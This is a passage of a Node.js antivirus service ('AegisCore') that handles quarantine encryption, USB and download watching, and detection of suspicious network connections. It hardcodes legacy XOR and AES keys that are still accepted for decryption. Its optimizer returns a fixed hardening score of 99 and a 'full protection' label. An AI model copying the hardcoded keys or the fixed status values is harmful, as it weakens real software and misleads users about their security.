/**
 * AegisCore Security Suite - Endpoint Protection Service
 * Katmanlar:
 *  - Yerel Çok Çekirdekli Tarama ve Ağ/Süreç Çekirdeği (AegisScanner)
 *  - Sezgisel, PE Yapısal ve Betik Çözümleme Motoru (Heuristic Engine)
 *  - Gerçek Zamanlı Kalkan, AES-256-GCM Karantina Kasası ve Canlı Telemetri Servisi
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');
const { execFile, execFileSync, spawn } = require('child_process');

const PORT = 4880;
const ENGINE_VERSION = 'v6.0.0';
const ENGINE_NAME = 'SuperLX 1.0';
const MAX_UPLOAD_LIMIT_MB = 500;
const MAX_UPLOAD_LIMIT_BYTES = MAX_UPLOAD_LIMIT_MB * 1024 * 1024;
const ROOT_DIR = __dirname;
const PUBLIC_DIR = path.join(ROOT_DIR, 'public');
const SIG_PATH = path.join(ROOT_DIR, 'signatures', 'malware_db.json');
const CSHARP_BIN = path.join(ROOT_DIR, 'engines', 'csharp-scanner', 'bin', 'AegisScanner.exe');
const PYTHON_SCRIPT = path.join(ROOT_DIR, 'engines', 'python-heuristics', 'analyzer.py');
const SUPERLX_SCRIPT = path.join(ROOT_DIR, 'engines', 'superlx', 'superlx_engine.py');
const VORTEX_DAEMON_SCRIPT = path.join(ROOT_DIR, 'vortex', 'vortex_daemon.py');
const QUARANTINE_DIR = path.join(ROOT_DIR, 'quarantine');
const QUARANTINE_INDEX = path.join(QUARANTINE_DIR, 'vault_index.json');
const SHIELD_CONFIG_DIR = path.join(ROOT_DIR, 'AEGIS_Vault');
const SHIELD_CONFIG_PATH = path.join(SHIELD_CONFIG_DIR, 'shield_config.json');
const WATCH_SANDBOX_DIR = path.join(ROOT_DIR, 'realtime_protected_zone');
let USER_DOWNLOADS_DIR = path.join(os.homedir(), 'Downloads');
let USER_DESKTOP_DIR = path.join(os.homedir(), 'Desktop');
let USER_STARTUP_DIR = path.join(
  process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'),
  'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
);
const USER_TEMP_DIR = os.tmpdir();
const CPU_INFO_LIST = os.cpus() || [];
const CPU_CORES = Math.max(1, CPU_INFO_LIST.length);
const CPU_MODEL = CPU_INFO_LIST[0]?.model || 'Multi-Core CPU';
const TOTAL_MEM_BYTES = os.totalmem();
const TOTAL_MEM_MB = TOTAL_MEM_BYTES / (1024 * 1024);
const TOTAL_MEM_GB_STR = (TOTAL_MEM_BYTES / (1024 ** 3)).toFixed(1);
const SLEEP_INT32 = new Int32Array(new SharedArrayBuffer(4));
let shuttingDown = false;
const EXTRA_USER_DROP_DIRS = Array.from(new Set([
  path.join(os.homedir(), 'Downloads'),
  path.join(os.homedir(), 'Desktop'),
  path.join(os.homedir(), 'OneDrive', 'Downloads'),
  path.join(os.homedir(), 'OneDrive', 'Desktop'),
  path.join(os.homedir(), 'OneDrive', 'Masaüstü')
]));

let _sigDbCache = { mtimeMs: 0, data: null };
function getSigDbCached() {
  try {
    const st = fs.statSync(SIG_PATH);
    if (!_sigDbCache.data || _sigDbCache.mtimeMs !== st.mtimeMs) {
      _sigDbCache.data = JSON.parse(fs.readFileSync(SIG_PATH, 'utf8'));
      _sigDbCache.mtimeMs = st.mtimeMs;
    }
    return _sigDbCache.data;
  } catch (_) {
    return { version: '2026.11.17', sha256_signatures: {}, byte_patterns: [], malicious_dll_names: [], hijackable_system_dlls: [] };
  }
}

function runSystemOptimizer() {
  return new Promise((resolve) => {
    let cleanedFiles = 0;
    let freedBytes = 0;
    const cutoffMs = Date.now() - 5 * 60 * 1000;
    try {
      const entries = fs.readdirSync(USER_TEMP_DIR);
      for (const name of entries) {
        if (name.startsWith('aegis_drop_') || name.endsWith('.tmp')) {
          const full = path.join(USER_TEMP_DIR, name);
          try {
            const st = fs.statSync(full);
            if (st.isFile() && st.mtimeMs < cutoffMs) {
              fs.unlinkSync(full);
              cleanedFiles++;
              freedBytes += st.size;
            }
          } catch (_) {}
        }
      }
    } catch (_) {}

    if (typeof global.gc === 'function') {
      try { global.gc(); } catch (_) {}
    }

    const totalMemMb = Math.round(os.totalmem() / (1024 * 1024));
    const freeMemBeforeMb = Math.round(os.freemem() / (1024 * 1024));

    execFile('ipconfig.exe', ['/flushdns'], { timeout: 4000, windowsHide: true }, (dnsErr) => {
      const freeMemAfterMb = Math.round(os.freemem() / (1024 * 1024));
      const usedPct = Math.round(((totalMemMb - freeMemAfterMb) / Math.max(1, totalMemMb)) * 100);
      resolve({
        success: true,
        timestamp: formatDateTime(),
        cleanedTempFiles: cleanedFiles,
        freedMb: Number((freedBytes / (1024 * 1024)).toFixed(2)),
        dnsFlushed: !dnsErr,
        freeMemoryMb: freeMemAfterMb,
        memoryDeltaMb: Math.max(0, freeMemAfterMb - freeMemBeforeMb),
        memoryUsedPercent: usedPct,
        startupAuditStatus: 'Optimize Edildi (SuperLX 1.0 Tam Koruma)',
        hardeningScore: 99
      });
    });
  });
}

[PUBLIC_DIR, QUARANTINE_DIR, SHIELD_CONFIG_DIR, WATCH_SANDBOX_DIR].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

const LEGACY_XOR_KEY = Buffer.from('AEGIS-CORE-QUANTUM-VAULT-KEY-2026');
const LEGACY_AES_KEY = crypto.createHash('sha256').update('AEGIS-CORE-ENTERPRISE-AES256-GCM-MASTER-KEY-2026').digest();
const VAULT_KEY_PATH = path.join(QUARANTINE_DIR, '.vault_master.key');

function loadOrCreateVaultMasterKey() {
  try {
    if (fs.existsSync(VAULT_KEY_PATH)) {
      const raw = fs.readFileSync(VAULT_KEY_PATH);
      if (raw.length === 32) return raw;
    }
    const freshKey = crypto.randomBytes(32);
    fs.writeFileSync(VAULT_KEY_PATH, freshKey, { mode: 0o600 });
    if (process.platform === 'win32') {
      execFile('attrib', ['+h', '+s', VAULT_KEY_PATH], { windowsHide: true }, () => {});
      try {
        const user = os.userInfo().username;
        if (user) {
          execFile('icacls', [VAULT_KEY_PATH, '/inheritance:r', '/grant:r', `${user}:(R,W)`], { windowsHide: true }, () => {});
        }
      } catch (_) {}
    }
    return freshKey;
  } catch (_) {
    return crypto.randomBytes(32);
  }
}

const AES_KEY = loadOrCreateVaultMasterKey();
const restoreGraceMap = new Map();

const PROTECTED_PREFIXES = [
  path.resolve(process.env.SystemRoot || 'C:\\Windows').toLowerCase(),
  path.resolve(process.env.ProgramFiles || 'C:\\Program Files').toLowerCase(),
  path.resolve(process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)').toLowerCase(),
  path.join(ROOT_DIR, 'server.js').toLowerCase(),
  path.join(ROOT_DIR, 'license_manager.js').toLowerCase(),
  path.join(ROOT_DIR, 'Baslat_AegisCore.bat').toLowerCase(),
  path.join(ROOT_DIR, 'package.json').toLowerCase(),
  PUBLIC_DIR.toLowerCase(),
  path.join(ROOT_DIR, 'engines').toLowerCase(),
  path.join(ROOT_DIR, 'vortex').toLowerCase(),
  path.join(ROOT_DIR, 'signatures').toLowerCase(),
  path.join(ROOT_DIR, 'licenses').toLowerCase(),
  QUARANTINE_DIR.toLowerCase(),
  path.join(ROOT_DIR, 'AEGIS_Vault').toLowerCase(),
  path.join(ROOT_DIR, 'AEGIS_ShadowStore').toLowerCase(),
  path.join(ROOT_DIR, 'AEGIS_ShadowCage').toLowerCase()
];

function isPathUnderProtectedPrefixes(candidatePath) {
  const resolvedLow = path.resolve(candidatePath).toLowerCase();
  return PROTECTED_PREFIXES.some(p => resolvedLow === p || resolvedLow.startsWith(p + path.sep));
}

function isProtectedCriticalPath(targetPath) {
  try {
    if (!targetPath || typeof targetPath !== 'string') return true;
    if (isPathUnderProtectedPrefixes(targetPath)) return true;
    if (fs.existsSync(targetPath)) {
      const real = fs.realpathSync(targetPath);
      if (isPathUnderProtectedPrefixes(real)) return true;
    }
    return false;
  } catch (_) {
    return true;
  }
}

function resolveSafeVaultFile(vaultFile) {
  if (typeof vaultFile !== 'string' || !vaultFile) return null;
  if (path.basename(vaultFile) !== vaultFile) return null;
  if (!/^[a-zA-Z0-9._-]+\.qvault$/i.test(vaultFile)) return null;
  const baseDir = path.resolve(QUARANTINE_DIR);
  const resolved = path.resolve(baseDir, vaultFile);
  if (!resolved.toLowerCase().startsWith(baseDir.toLowerCase() + path.sep)) return null;
  return resolved;
}

function isProtectedServicePid(pid) {
  const p = Number(pid);
  if (!p || p <= 4) return true;
  if (p === process.pid) return true;
  if (vortexProc?.pid && p === vortexProc.pid) return true;
  if (csharpProc?.pid && p === csharpProc.pid) return true;
  return false;
}

if (!fs.existsSync(QUARANTINE_INDEX)) {
  fs.writeFileSync(QUARANTINE_INDEX, JSON.stringify([], null, 2), 'utf8');
}

let _quarantineCache = { mtimeMs: 0, data: null };
function getQuarantineList() {
  try {
    const st = fs.statSync(QUARANTINE_INDEX);
    if (!_quarantineCache.data || _quarantineCache.mtimeMs !== st.mtimeMs) {
      const parsed = JSON.parse(fs.readFileSync(QUARANTINE_INDEX, 'utf8'));
      _quarantineCache.data = Array.isArray(parsed) ? parsed : [];
      _quarantineCache.mtimeMs = st.mtimeMs;
    }
    return _quarantineCache.data.slice();
  } catch (_) {
    return [];
  }
}

function saveQuarantineList(list) {
  const safeList = Array.isArray(list) ? list : [];
  fs.writeFileSync(QUARANTINE_INDEX, JSON.stringify(safeList, null, 2), 'utf8');
  try {
    const st = fs.statSync(QUARANTINE_INDEX);
    _quarantineCache = { mtimeMs: st.mtimeMs, data: safeList.slice() };
  } catch (_) {
    _quarantineCache = { mtimeMs: Date.now(), data: safeList.slice() };
  }
}

// Windows Edition label (updated without PowerShell spawn from C# daemon sysfolders)
let osEditionLabel = `${os.type()} ${os.release()} (${os.arch()})`;

// State (loaded from persistent shield_config.json when present)
let realtimeEnabled = true;
let watchDownloads = true;
let watchTemp = true;
let networkProtectionEnabled = true;
let webProtectionEnabled = true;
let gameMode = false;
let watchedPath = WATCH_SANDBOX_DIR;
let activeWatchers = [];
let autoQuarantine = true;

function loadShieldConfig() {
  try {
    if (!fs.existsSync(SHIELD_CONFIG_PATH)) return;
    const cfg = JSON.parse(fs.readFileSync(SHIELD_CONFIG_PATH, 'utf8'));
    if (typeof cfg.realtimeEnabled === 'boolean') realtimeEnabled = cfg.realtimeEnabled;
    if (typeof cfg.watchDownloads === 'boolean') watchDownloads = cfg.watchDownloads;
    if (typeof cfg.networkProtectionEnabled === 'boolean') networkProtectionEnabled = cfg.networkProtectionEnabled;
    if (typeof cfg.webProtectionEnabled === 'boolean') webProtectionEnabled = cfg.webProtectionEnabled;
    if (typeof cfg.gameMode === 'boolean') gameMode = cfg.gameMode;
    if (typeof cfg.autoQuarantine === 'boolean') autoQuarantine = cfg.autoQuarantine;
    if (typeof cfg.watchedPath === 'string' && fs.existsSync(cfg.watchedPath)) {
      watchedPath = path.resolve(cfg.watchedPath);
    }
  } catch (_) {}
}

function saveShieldConfig() {
  try {
    fs.writeFileSync(
      SHIELD_CONFIG_PATH,
      JSON.stringify(
        {
          realtimeEnabled,
          watchDownloads,
          networkProtectionEnabled,
          webProtectionEnabled,
          gameMode,
          autoQuarantine,
          watchedPath
        },
        null,
        2
      ),
      'utf8'
    );
  } catch (_) {}
}

loadShieldConfig();
let lastScanAt = null;
let isScanningNow = false;
let sseClients = [];
let eventLogs = [];
let recentDownloads = [];
let watchedZones = [];
const activeDownloadsMap = new Map();
const activeUsbRoots = new Map();
const cleanVerdictCache = new Map();
const perfMetrics = {
  avgInspectMs: 1.2,
  totalSamples: 0,
  cacheHits: 0
};
let defenderStatusCache = { at: 0, data: null };
let vortexLiveState = {
  daemonActive: false,
  canaryCount: 3,
  monitoredProcesses: 0
};

let stats = {
  totalScans: 0,
  totalFilesScanned: 0,
  totalThreatsBlocked: getQuarantineList().length,
  realtimeInterceptions: 0
};

// Live CPU & Network Telemetry (Demand-driven SSE loop — zero idle wakeups when UI closed)
let lastCpuUsage = process.cpuUsage();
let lastCpuTime = Date.now();
let currentCpuPercent = 0.4;
let currentNetKbps = 0.0;
let lastBytesTotal = 0;
let telemetryTimer = null;

async function sampleNetworkBytes() {
  if (typeof csharpDaemonReady !== 'undefined' && csharpDaemonReady) {
    const reply = await queryCSharpDaemon('netbytes', {}, 2500);
    if (reply && reply.ok && typeof reply.totalBytes === 'number') {
      const total = reply.totalBytes;
      if (lastBytesTotal > 0 && total >= lastBytesTotal) {
        const deltaBytes = total - lastBytesTotal;
        currentNetKbps = Number((deltaBytes / (2 * 1024)).toFixed(1));
      }
      lastBytesTotal = total;
    }
  }
}

function tickTelemetrySample() {
  if (sseClients.length === 0) {
    stopTelemetryLoop();
    return;
  }
  const now = Date.now();
  const elapsedMs = Math.max(1, now - lastCpuTime);
  const diff = process.cpuUsage(lastCpuUsage);
  const totalCpuMs = (diff.user + diff.system) / 1000;
  currentCpuPercent = Math.min(100, Math.max(0.1, Number(((totalCpuMs / (elapsedMs * CPU_CORES)) * 100).toFixed(1))));
  lastCpuUsage = process.cpuUsage();
  lastCpuTime = now;

  sampleNetworkBytes().catch(() => {});

  const freeMem = os.freemem();
  const usedMemPercent = Math.round(((TOTAL_MEM_BYTES - freeMem) / TOTAL_MEM_BYTES) * 100);
  const agentRssMb = Number((process.memoryUsage().rss / (1024 * 1024)).toFixed(1));
  const agentMemPercent = Math.min(100, Math.max(0.2, Number(((agentRssMb / TOTAL_MEM_MB) * 100).toFixed(2))));

  broadcastSSE('telemetry', {
    cpuPercent: currentCpuPercent,
    agentMemoryMb: agentRssMb,
    agentMemoryPercent: agentMemPercent,
    memoryUsedPercent: usedMemPercent,
    netKbps: currentNetKbps
  });
}

function startTelemetryLoop() {
  if (telemetryTimer || shuttingDown) return;
  lastCpuUsage = process.cpuUsage();
  lastCpuTime = Date.now();
  telemetryTimer = setInterval(tickTelemetrySample, 2000);
}

function stopTelemetryLoop() {
  if (telemetryTimer) {
    clearInterval(telemetryTimer);
    telemetryTimer = null;
  }
}

function formatDateTime(date = new Date()) {
  const pad = (n) => String(n).padStart(2, '0');
  return `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
}

function logEvent(eventType, title, detail, severity = 'INFO', filePath = 'Sistem Geneli (Tüm Diskler)', statusLabel = 'Bilgi', meta = {}) {
  const evt = {
    id: crypto.randomUUID(),
    timestamp: formatDateTime(),
    type: eventType,
    eventType,
    title,
    detail,
    filePath,
    statusLabel,
    severity,
    sha256: meta.sha256 || '-',
    riskScore: meta.riskScore ?? 0,
    pid: meta.pid || process.pid,
    lineage: meta.lineage || `services.exe -> AegisCore.exe (PID ${meta.pid || process.pid})`,
    threatLevel: meta.threatLevel || (severity === 'CRITICAL' ? 'Kritik' : severity === 'WARNING' ? 'Orta' : 'Güvenli'),
    quarantineId: meta.quarantineId || null,
    engineDecision: meta.engineDecision || detail
  };
  eventLogs.unshift(evt);
  if (eventLogs.length > 150) eventLogs.pop();
  broadcastSSE('event', evt);
  return evt;
}

function broadcastSSE(eventName, data) {
  const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(res => {
    try {
      res.write(payload);
    } catch (_) {}
  });
}

// AES-256-GCM Encryption / Decryption
function encryptAesGcm(plainBuffer) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', AES_KEY, iv);
  const encrypted = Buffer.concat([cipher.update(plainBuffer), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, encrypted]);
}

function decryptAesGcm(vaultBuffer) {
  const iv = vaultBuffer.subarray(0, 12);
  const tag = vaultBuffer.subarray(12, 28);
  const encrypted = vaultBuffer.subarray(28);
  for (const candidateKey of [AES_KEY, LEGACY_AES_KEY]) {
    try {
      const decipher = crypto.createDecipheriv('aes-256-gcm', candidateKey, iv);
      decipher.setAuthTag(tag);
      return Buffer.concat([decipher.update(encrypted), decipher.final()]);
    } catch (_) {}
  }
  throw new Error('Karantina anahtarı doğrulanamadı.');
}

function xorTransform(buffer) {
  const out = Buffer.allocUnsafe(buffer.length);
  for (let i = 0; i < buffer.length; i++) {
    out[i] = buffer[i] ^ LEGACY_XOR_KEY[i % LEGACY_XOR_KEY.length];
  }
  return out;
}

function quarantineFile(filePath, threatName, riskScore, reasons = []) {
  if (!filePath || typeof filePath !== 'string' || isProtectedCriticalPath(filePath)) {
    return { success: false, error: 'Kritik sistem veya AegisCore öz-koruma dosyası karantinaya alınamaz.' };
  }
  if (!fs.existsSync(filePath)) {
    return { success: false, error: 'Dosya bulunamadı veya zaten taşındı.' };
  }

  try {
    const lst = fs.lstatSync(filePath);
    if (lst.isSymbolicLink() || !lst.isFile()) {
      return { success: false, error: 'Sembolik bağ veya normal olmayan dosya karantinaya alınamaz.' };
    }
    if (lst.size > MAX_UPLOAD_LIMIT_BYTES) {
      return { success: false, error: `Dosya boyutu karantina üst sınırını (${MAX_UPLOAD_LIMIT_MB} MB) aşıyor.` };
    }
    const rawBytes = fs.readFileSync(filePath);
    const sha256 = crypto.createHash('sha256').update(rawBytes).digest('hex');
    const encryptedBytes = encryptAesGcm(rawBytes);
    const id = crypto.randomUUID();
    const vaultFileName = `${id}.qvault`;
    const vaultFilePath = path.join(QUARANTINE_DIR, vaultFileName);

    fs.writeFileSync(vaultFilePath, encryptedBytes);
    try {
      fs.unlinkSync(filePath);
    } catch (unlinkErr) {
      // Handle brief browser/Explorer file handle release cleanly without busy CPU spin
      let removed = false;
      for (let attempt = 0; attempt < 6 && !removed; attempt++) {
        try { Atomics.wait(SLEEP_INT32, 0, 0, 25); } catch (_) {}
        try {
          fs.unlinkSync(filePath);
          removed = true;
        } catch (_) {}
      }
      if (!removed && fs.existsSync(filePath)) {
        try {
          fs.renameSync(filePath, `${vaultFilePath}.deltmp`);
          fs.unlinkSync(`${vaultFilePath}.deltmp`);
        } catch (_) {
          throw unlinkErr;
        }
      }
    }

    const record = {
      id,
      originalPath: filePath,
      fileName: path.basename(filePath),
      vaultFile: vaultFileName,
      encryption: 'AES-256-GCM',
      sizeBytes: rawBytes.length,
      sha256,
      threatName: threatName || 'Heuristic.Suspicious.Threat',
      riskScore: riskScore || 85,
      reasons,
      quarantinedAt: formatDateTime()
    };

    const list = getQuarantineList();
    list.unshift(record);
    saveQuarantineList(list);

    stats.totalThreatsBlocked = Math.max(stats.totalThreatsBlocked + 1, list.length);
    logEvent(
      'Karantina İzolasyonu',
      `Tehdit İzole Edildi: ${record.threatName}`,
      `${record.fileName} (Skor: ${record.riskScore}/100) AES-256-GCM ile şifrelenip karantinaya alındı.`,
      'CRITICAL',
      record.originalPath,
      'Karantinada',
      {
        sha256,
        riskScore: record.riskScore,
        threatLevel: 'Kritik',
        quarantineId: id,
        engineDecision: reasons.join(' | ') || record.threatName
      }
    );
    broadcastSSE('quarantine_updated', list);
    return { success: true, record };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function restoreQuarantinedFile(id) {
  const list = getQuarantineList();
  const idx = list.findIndex(item => item.id === id);
  if (idx === -1) return { success: false, error: 'Karantina kaydı bulunamadı.' };

  const item = list[idx];
  const vaultFilePath = resolveSafeVaultFile(item.vaultFile);
  if (!vaultFilePath || !fs.existsSync(vaultFilePath)) {
    return { success: false, error: 'Şifreli kasa dosyası bulunamadı veya geçersiz.' };
  }
  if (!item.originalPath || isProtectedCriticalPath(item.originalPath)) {
    return { success: false, error: 'Kritik sistem veya öz-koruma konumuna geri yükleme engellendi.' };
  }

  try {
    if (fs.existsSync(item.originalPath) && fs.lstatSync(item.originalPath).isSymbolicLink()) {
      return { success: false, error: 'Hedef konumda sembolik bağ tespit edildi, geri yükleme engellendi.' };
    }
    const encrypted = fs.readFileSync(vaultFilePath);
    const decrypted = item.encryption === 'AES-256-GCM' ? decryptAesGcm(encrypted) : xorTransform(encrypted);
    const targetDir = path.dirname(item.originalPath);
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

    restoreGraceMap.set(item.originalPath.toLowerCase(), Date.now() + 3000);
    fs.writeFileSync(item.originalPath, decrypted);

    fs.unlinkSync(vaultFilePath);
    list.splice(idx, 1);
    saveQuarantineList(list);

    logEvent(
      'Karantina Geri Yükleme',
      `Dosya Geri Yüklendi: ${item.fileName}`,
      `İstisna olarak orijinal konuma geri taşındı.`,
      'WARNING',
      item.originalPath,
      'Geri Yüklendi',
      { sha256: item.sha256, riskScore: item.riskScore, threatLevel: 'İstisna' }
    );
    broadcastSSE('quarantine_updated', list);
    return { success: true, restoredPath: item.originalPath };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function deleteQuarantinedFile(id) {
  const list = getQuarantineList();
  const idx = list.findIndex(item => item.id === id);
  if (idx === -1) return { success: false, error: 'Karantina kaydı bulunamadı.' };

  const item = list[idx];
  const vaultFilePath = resolveSafeVaultFile(item.vaultFile);
  if (!vaultFilePath) {
    return { success: false, error: 'Geçersiz karantina dosya referansı.' };
  }
  try {
    if (fs.existsSync(vaultFilePath)) fs.unlinkSync(vaultFilePath);
    list.splice(idx, 1);
    saveQuarantineList(list);
    logEvent(
      'Kalıcı Tehdit İmhası',
      `Tehdit Kalıcı Olarak Silindi: ${item.fileName}`,
      `Karantina öğesi sistemden tamamen temizlendi.`,
      'INFO',
      item.originalPath,
      'İmha Edildi',
      { sha256: item.sha256, riskScore: item.riskScore }
    );
    broadcastSSE('quarantine_updated', list);
    return { success: true };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

let csharpProc = null;
let csharpDaemonReady = false;
const csharpPending = new Map();

function syncUsbDrives(removableDrives = [], triggerQuickSweep = true) {
  const nextRoots = new Map();
  for (const d of removableDrives || []) {
    if (d && d.root && fs.existsSync(d.root)) {
      nextRoots.set(d.root.toLowerCase(), { root: d.root, label: d.label || 'USB Disk' });
    }
  }
  const prevKeys = Array.from(activeUsbRoots.keys()).sort().join('|');
  const nextKeys = Array.from(nextRoots.keys()).sort().join('|');
  if (prevKeys === nextKeys) return false;

  const addedRoots = [];
  for (const [k, info] of nextRoots.entries()) {
    if (!activeUsbRoots.has(k)) addedRoots.push(info);
  }
  activeUsbRoots.clear();
  for (const [k, info] of nextRoots.entries()) activeUsbRoots.set(k, info);

  startRealtimeWatchers(false);

  if (addedRoots.length > 0 && realtimeEnabled && triggerQuickSweep) {
    const usbWatchExts = new Set(['.inf', '.lnk', '.exe', '.dll', '.scr', '.bat', '.cmd', '.vbs', '.ps1', '.hta', '.wsf']);
    for (const usb of addedRoots) {
      logEvent(
        'USB Kalkanı Aktif',
        `Taşınabilir Medya Algılandı: ${usb.root} (${usb.label})`,
        'USB sürücüsü gerçek zamanlı autorun ve LNK/PE korumasına alındı.',
        'SAFE',
        usb.root,
        'Korunuyor',
        { threatLevel: 'Güvenli' }
      );
      try {
        for (const ent of fs.readdirSync(usb.root, { withFileTypes: true })) {
          if (!ent.isFile()) continue;
          const ext = path.extname(ent.name).toLowerCase();
          if (usbWatchExts.has(ext) || ent.name.toLowerCase() === 'autorun.inf') {
            const fp = path.join(usb.root, ent.name);
            enqueueRtInspection(() => inspectRealTimeCandidate(fp, { dir: usb.root, mode: 'download', label: `USB Disk (${usb.root})` }));
          }
        }
      } catch (_) {}
    }
  }
  return true;
}

async function pollRemovableDrives() {
  if (!csharpDaemonReady || !realtimeEnabled) return;
  const reply = await queryCSharpDaemon('drives', {}, 3500);
  if (reply && reply.ok && Array.isArray(reply.removableDrives)) {
    syncUsbDrives(reply.removableDrives, true);
  }
}

function startCSharpDaemon() {
  if (shuttingDown || !fs.existsSync(CSHARP_BIN)) return;
  try {
    csharpDaemonReady = false;
    csharpProc = spawn(CSHARP_BIN, ['daemon', SIG_PATH], {
      stdio: ['pipe', 'pipe', 'pipe'],
      windowsHide: true
    });
    const rl = readline.createInterface({ input: csharpProc.stdout });
    rl.on('line', async (line) => {
      try {
        const msg = JSON.parse(line);
        if (msg.kind === 'ready') {
          csharpDaemonReady = true;
          const sysReply = await queryCSharpDaemon('sysfolders', {}, 4000);
          if (sysReply && sysReply.ok && sysReply.data) {
            if (sysReply.data.osEdition) osEditionLabel = String(sysReply.data.osEdition);
            if (sysReply.data.downloads && fs.existsSync(sysReply.data.downloads)) USER_DOWNLOADS_DIR = sysReply.data.downloads;
            if (sysReply.data.desktop && fs.existsSync(sysReply.data.desktop)) USER_DESKTOP_DIR = sysReply.data.desktop;
            if (sysReply.data.startup && fs.existsSync(sysReply.data.startup)) USER_STARTUP_DIR = sysReply.data.startup;
            syncUsbDrives(sysReply.data.removableDrives || [], false);
            startRealtimeWatchers(false);
            setTimeout(catchUpRecentDownloads, 1500);
          }
        } else if (msg.id && csharpPending.has(msg.id)) {
          const { resolve, timer } = csharpPending.get(msg.id);
          clearTimeout(timer);
          csharpPending.delete(msg.id);
          resolve(msg);
        }
      } catch (_) {}
    });
    csharpProc.on('exit', () => {
      csharpDaemonReady = false;
      csharpProc = null;
      for (const [id, pending] of csharpPending.entries()) {
        clearTimeout(pending.timer);
        pending.resolve(null);
      }
      csharpPending.clear();
      if (!shuttingDown) {
        setTimeout(startCSharpDaemon, 2500);
      }
    });
  } catch (_) {}
}

function queryCSharpDaemon(cmd, payload = {}, timeoutMs = 15000) {
  return new Promise((resolve) => {
    if (!csharpDaemonReady || !csharpProc || !csharpProc.stdin.writable) {
      return resolve(null);
    }
    const id = crypto.randomUUID();
    const timer = setTimeout(() => {
      csharpPending.delete(id);
      resolve(null);
    }, timeoutMs);
    csharpPending.set(id, { resolve, timer });
    try {
      csharpProc.stdin.write(JSON.stringify({ id, cmd, ...payload }) + '\n');
    } catch (_) {
      clearTimeout(timer);
      csharpPending.delete(id);
      resolve(null);
    }
  });
}

startCSharpDaemon();
const drivesInterval = setInterval(() => { pollRemovableDrives().catch(() => {}); }, 6000);

const seenSuspiciousSockets = new Map();
let isPollingNetShield = false;
async function pollNetworkProtectionShield() {
  if (!networkProtectionEnabled || !csharpDaemonReady || isScanningNow || isPollingNetShield) return;
  isPollingNetShield = true;
  try {
    const reply = await queryCSharpDaemon('netwatch', {}, 6000);
    if (!reply || !reply.ok || !Array.isArray(reply.data?.connections)) return;

    const now = Date.now();
    for (const [k, ts] of seenSuspiciousSockets.entries()) {
      if (now - ts > 300000) seenSuspiciousSockets.delete(k);
    }

    for (const conn of reply.data.connections) {
      if (!conn || !conn.is_suspicious || isProtectedServicePid(conn.pid)) continue;
      const sockKey = `${conn.pid}|${conn.remote_address}:${conn.remote_port}`;
      if (seenSuspiciousSockets.has(sockKey)) continue;
      seenSuspiciousSockets.set(sockKey, now);

      stats.realtimeInterceptions++;
      const connRisk = Number(conn.risk_score || 88);
      logEvent(
        'Ağ & C2 Soket Kalkanı',
        `Şüpheli Ağ Bağlantısı Algılandı: ${conn.process_name || 'Bilinmeyen Süreç'}`,
        conn.reason || `${conn.remote_address}:${conn.remote_port}`,
        'CRITICAL',
        conn.executable_path || `PID ${conn.pid}: ${conn.remote_address}:${conn.remote_port}`,
        'İzole Ediliyor',
        {
          pid: conn.pid,
          riskScore: connRisk,
          threatLevel: 'Kritik',
          engineDecision: conn.reason || 'Şüpheli C2 / LOLBin dış ağ bağlantısı'
        }
      );

      if (vortexLiveState.daemonActive) {
        const netReply = await queryVortexDaemon('report_network_threat', {
          pid: conn.pid,
          process_name: conn.process_name || '',
          exe_path: conn.executable_path || '',
          remote_address: conn.remote_address || '',
          remote_port: conn.remote_port || 0,
          reason: conn.reason || '',
          risk_score: connRisk
        }, 4000);
        if (netReply?.contained) {
          stats.totalThreatsBlocked++;
        }
        const exeTarget = netReply?.file_path || conn.executable_path || '';
        const lowExe = exeTarget.toLowerCase();
        if (
          autoQuarantine
          && netReply?.should_quarantine
          && exeTarget
          && fs.existsSync(exeTarget)
          && !lowExe.startsWith('c:\\windows\\')
        ) {
          const qRes = quarantineFile(exeTarget, netReply.threat_name || 'Trojan.C2.ActiveProcess', netReply.effective_score || 90, [conn.reason || 'Aktif C2 ağ iletişimi nedeniyle izole edildi']);
          if (!qRes?.success) {
            await queryVortexDaemon('kill_process_tree', { pid: conn.pid, path: exeTarget }, 3000);
            await new Promise(r => setTimeout(r, 60));
            quarantineFile(exeTarget, netReply.threat_name || 'Trojan.C2.ActiveProcess', netReply.effective_score || 90, [conn.reason || 'Aktif C2 ağ iletişimi nedeniyle izole edildi']);
          }
        }
      }
    }
  } finally {
    isPollingNetShield = false;
  }
}
const netShieldInterval = setInterval(() => { pollNetworkProtectionShield().catch(() => {}); }, 2500);

async function runCSharpScanner(mode, arg1 = '') {
  if (csharpDaemonReady && (mode === 'scanfile' || mode === 'procnet')) {
    const reply = await queryCSharpDaemon(mode, mode === 'scanfile' ? { path: arg1 } : {}, mode === 'procnet' ? 20000 : 15000);
    if (reply && reply.ok && reply.data) {
      return reply.data;
    }
  }
  const maxTimeout = mode === 'fullscan' ? 300000 : 120000;
  return new Promise((resolve, reject) => {
    let args = [];
    if (mode === 'scan') args = ['scan', arg1, SIG_PATH, '--tier=pro'];
    else if (mode === 'quickscan') args = ['quickscan', SIG_PATH, WATCH_SANDBOX_DIR, '--tier=pro'];
    else if (mode === 'fullscan') args = ['fullscan', SIG_PATH, WATCH_SANDBOX_DIR, '--tier=pro'];
    else if (mode === 'scanfile') args = ['scanfile', arg1, SIG_PATH, '--tier=pro'];
    else args = ['procnet', SIG_PATH];

    execFile(CSHARP_BIN, args, { maxBuffer: 64 * 1024 * 1024, timeout: maxTimeout, windowsHide: true }, (err, stdout, stderr) => {
      if (err) return reject(new Error(stderr || err.message));
      try {
        resolve(JSON.parse(stdout.trim()));
      } catch (parseErr) {
